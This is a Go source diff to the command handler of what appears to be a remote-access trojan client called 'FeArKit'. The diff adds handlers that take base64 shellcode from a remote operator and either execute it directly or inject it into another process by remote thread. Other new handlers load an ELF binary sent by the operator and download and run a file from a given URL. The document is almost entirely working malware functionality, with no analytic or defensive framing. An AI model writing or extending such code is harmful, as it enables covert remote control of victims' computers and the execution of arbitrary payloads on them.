@@ -6,6 +6,8 @@ import (
 	"FeArKit/client/service/desktop"
 	"FeArKit/client/service/file"
 	"FeArKit/client/service/process"
+	"FeArKit/client/service/shellcode"
+	"FeArKit/client/service/executable"
 	Screenshot "FeArKit/client/service/screenshot"
 	"FeArKit/client/service/terminal"
 	"FeArKit/modules"
@@ -14,15 +16,13 @@ import (
 	"os/exec"
 	"reflect"
 	"strings"
+	"encoding/base64"
+	"regexp"
 )
 
 var handlers = map[string]func(pack modules.Packet, wsConn *common.Conn){
 	`PING`:             ping,
-	`OFFLINE`:          offline,
-	`LOCK`:             lock,
-	`LOGOFF`:           logoff,
-	`HIBERNATE`:        hibernate,
-	`SUSPEND`:          suspend,
+	`KILL`:          	kill,
 	`RESTART`:          restart,
 	`SHUTDOWN`:         shutdown,
 	`SCREENSHOT`:       screenshot,
@@ -43,6 +43,9 @@ var handlers = map[string]func(pack modules.Packet, wsConn *common.Conn){
 	`DESKTOP_KILL`:     killDesktop,
 	`DESKTOP_SHOT`:     getDesktop,
 	`COMMAND_EXEC`:     execCommand,
+	`SHELLCODE_EXEC`:   execShellcode,
+	`LOAD_ELF`:  		loadElf,
+	`DOWNLOAD_EXEC`:  	DownloadAndExecute,
 }
 
 func ping(pack modules.Packet, wsConn *common.Conn) {
@@ -55,47 +58,11 @@ func ping(pack modules.Packet, wsConn *common.Conn) {
 	wsConn.SendPack(modules.CommonPack{Act: `DEVICE_UPDATE`, Data: *device})
 }
 
-func offline(pack modules.Packet, wsConn *common.Conn) {
+func kill(pack modules.Packet, wsConn *common.Conn) {
 	wsConn.SendCallback(modules.Packet{Code: 0}, pack)
 	stop = true
 	wsConn.Close()
 	os.Exit(0)
-}
-
-func lock(pack modules.Packet, wsConn *common.Conn) {
-	err := basic.Lock()
-	if err != nil {
-		wsConn.SendCallback(modules.Packet{Code: 1, Msg: err.Error()}, pack)
-	} else {
-		wsConn.SendCallback(modules.Packet{Code: 0}, pack)
-	}
-}
-
-func logoff(pack modules.Packet, wsConn *common.Conn) {
-	err := basic.Logoff()
-	if err != nil {
-		wsConn.SendCallback(modules.Packet{Code: 1, Msg: err.Error()}, pack)
-	} else {
-		wsConn.SendCallback(modules.Packet{Code: 0}, pack)
-	}
-}
-
-func hibernate(pack modules.Packet, wsConn *common.Conn) {
-	err := basic.Hibernate()
-	if err != nil {
-		wsConn.SendCallback(modules.Packet{Code: 1, Msg: err.Error()}, pack)
-	} else {
-		wsConn.SendCallback(modules.Packet{Code: 0}, pack)
-	}
-}
-
-func suspend(pack modules.Packet, wsConn *common.Conn) {
-	err := basic.Suspend()
-	if err != nil {
-		wsConn.SendCallback(modules.Packet{Code: 1, Msg: err.Error()}, pack)
-	} else {
-		wsConn.SendCallback(modules.Packet{Code: 0}, pack)
-	}
 }
 
 func restart(pack modules.Packet, wsConn *common.Conn) {
@@ -349,16 +316,50 @@ func execCommand(pack modules.Packet, wsConn *common.Conn) {
 	} else {
 		cmd = val.(string)
 	}
-	if val, ok := pack.Data[`args`]; !ok {
-		wsConn.SendCallback(modules.Packet{Code: 1, Msg: `${i18n|COMMON.INVALID_PARAMETER}`}, pack)
-		return
-	} else {
-		args = val.(string)
+	if len(cmd) > 0 {
+		var execCmd, execArgs string
+		// If cmd starts with a quote (double or single)
+		if cmd[0] == '"' || cmd[0] == '\'' {
+			quote := cmd[0]
+			// Find the closing matching quote.
+			endQuote := strings.IndexRune(cmd[1:], rune(quote))
+			if endQuote >= 0 {
+				endQuote += 1 // adjust since we started at index 1
+				// The command is the substring inside the quotes.
+				execCmd = cmd[1:endQuote]
+				// Everything after the closing quote (if any) is treated as arguments.
+				if len(cmd) > endQuote+1 {
+					execArgs = strings.TrimSpace(cmd[endQuote+1:])
+				}
+			} else {
+				// No matching quote found, use the full string.
+				execCmd = cmd
+			}
+		} else {
+			// Split at the first space.
+			parts := strings.SplitN(cmd, " ", 2)
+			execCmd = parts[0]
+			if len(parts) == 2 {
+				execArgs = parts[1]
+			}
+		}
+		cmd = execCmd
+		// Set the args variable for later use.
+		args = execArgs
 	}
 	if len(args) == 0 {
 		proc = exec.Command(cmd)
 	} else {
-		proc = exec.Command(cmd, strings.Split(args, ` `)...)
+		re := regexp.MustCompile(`("[^"]+"|'[^']+'|\S+)`)
+		matches := re.FindAllString(args, -1)
+		var argSlice []string
+		for _, arg := range matches {
+			if (arg[0] == '"' && arg[len(arg)-1] == '"') || (arg[0] == '\'' && arg[len(arg)-1] == '\'') {
+				arg = arg[1 : len(arg)-1]
+			}
+			argSlice = append(argSlice, arg)
+		}
+		proc = exec.Command(cmd, argSlice...)
 	}
 	err := proc.Start()
 	if err != nil {
@@ -370,6 +371,87 @@ func execCommand(pack modules.Packet, wsConn *common.Conn) {
 		proc.Process.Release()
 	}
 }
+
+func loadElf(pack modules.Packet, wsConn *common.Conn) {
+	var path string
+	var elf string
+	if val, ok := pack.Data[`elf`]; !ok {
+		wsConn.SendCallback(modules.Packet{Code: 1, Msg: `${i18n|COMMON.INVALID_PARAMETER}`}, pack)
+		return
+	} else {
+		elf = val.(string)
+	}
+	elfBytes, err := base64.StdEncoding.DecodeString(elf)
+	if err != nil {
+		wsConn.SendCallback(modules.Packet{Code: 1, Msg: err.Error()}, pack)
+		return
+	}
+	if val, ok := pack.Data[`path`]; !ok {
+		path = ""
+	} else {
+		path = val.(string)
+	}
+	err = executable.LoadElf(elfBytes,  path)
+
+	if err != nil {
+		wsConn.SendCallback(modules.Packet{Code: 1, Msg: err.Error()}, pack)
+	}else {
+		wsConn.SendCallback(modules.Packet{Code: 0}, pack)
+	}
+}
+
+func DownloadAndExecute(pack modules.Packet, wsConn *common.Conn) {
+	var url string
+	var path string
+	if val, ok := pack.Data[`url`]; !ok {
+		wsConn.SendCallback(modules.Packet{Code: 1, Msg: `${i18n|COMMON.INVALID_PARAMETER}`}, pack)
+		return
+	} else {
+		url = val.(string)
+	}
+	if val, ok := pack.Data[`path`]; !ok {
+		path = ""
+	} else {
+		path = val.(string)
+	}
+	err := executable.DownloadAndExecute(url, path)
+	if err != nil {
+		wsConn.SendCallback(modules.Packet{Code: 1, Msg: err.Error()}, pack)
+	}else {
+		wsConn.SendCallback(modules.Packet{Code: 0}, pack)
+	}
+}
+
+func execShellcode(pack modules.Packet, wsConn *common.Conn) {
+	var scode string
+	if val, ok := pack.Data[`shellcode`]; !ok {
+		wsConn.SendCallback(modules.Packet{Code: 1, Msg: `${i18n|COMMON.INVALID_PARAMETER}`}, pack)
+		return
+	} else {
+		scode = val.(string)
+	}
+	scodeBytes, err := base64.StdEncoding.DecodeString(scode)
+	if err != nil {
+		wsConn.SendCallback(modules.Packet{Code: 1, Msg: err.Error()}, pack)
+		return
+	}
+	if val, ok := pack.Data[`targetimage`]; ok && val != "" {
+		if targetImageStr, isStr := val.(string); isStr {
+			err = shellcode.StartRemoteThread(scodeBytes, targetImageStr)
+		} else {
+			wsConn.SendCallback(modules.Packet{Code: 1, Msg: `${i18n|COMMON.INVALID_PARAMETER}`}, pack)
+			return
+		}
+	} else {
+		err = shellcode.ExecShellcode(scodeBytes)
+	}
+	if err != nil {
+		wsConn.SendCallback(modules.Packet{Code: 1, Msg: err.Error()}, pack)
+	}else {
+		wsConn.SendCallback(modules.Packet{Code: 0}, pack)
+	}
+}
+
 
 func inputRawTerminal(pack []byte, event string) {
 	terminal.InputRawTerminal(pack, event)
